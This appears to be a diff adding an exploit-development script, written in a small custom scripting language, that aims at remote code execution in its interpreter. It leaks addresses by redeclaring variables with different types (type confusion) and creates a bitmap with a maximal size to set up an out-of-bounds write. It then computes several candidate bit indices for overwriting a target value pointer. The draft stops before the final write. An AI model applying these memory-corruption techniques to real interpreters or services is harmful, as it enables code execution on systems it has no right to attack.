@@ -1,0 +1,58 @@
+print("=== RCE: Try Multiple Bitmap Buffer Offsets ===");
+
+print("Step 1: Leak addresses");
+int leak1 = 0;
+string leak1 = "first";
+int addr1 = leak1;
+print("addr1:");
+print(addr1);
+
+string v2 = "BBBBBBBB";
+int v2 = 4231312;
+int leaked = length(v2);
+print("Leaked libc:");
+print(leaked);
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("targetaddr:");
+print(targetaddr);
+
+print("Step 2: Create bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 3: Try different bitmap buffer estimates");
+print("Test 1: bitmap = addr1 - 0x500");
+int bitmapptr1 = addr1 - 1280;
+int entryaddr1 = targetaddr - 768;
+int valueptr1 = entryaddr1 + 40;
+int offset1 = valueptr1 - bitmapptr1;
+int bitindex1 = offset1 * 8;
+print("bit_index1:");
+print(bitindex1);
+
+print("Test 2: bitmap = addr1 - 0x800");
+int bitmapptr2 = addr1 - 2048;
+int offset2 = valueptr1 - bitmapptr2;
+int bitindex2 = offset2 * 8;
+print("bit_index2:");
+print(bitindex2);
+
+print("Test 3: bitmap = addr1 - 0x2000");
+int bitmapptr3 = addr1 - 8192;
+int offset3 = valueptr1 - bitmapptr3;
+int bitindex3 = offset3 * 8;
+print("bit_index3:");
+print(bitindex3);
+
+print("Test 4: bitmap = targetaddr - 0x1000");
+int bitmapptr4 = targetaddr - 4096;
+int offset4 = valueptr1 - bitmapptr4;
+int bitindex4 = offset4 * 8;
+print("bit_index4:");
+print(bitindex4);
+
+print("Step 4: Find which bit_index matches calculated 33984");
+print("Then use that bitmap buffer estimate for the write");
+
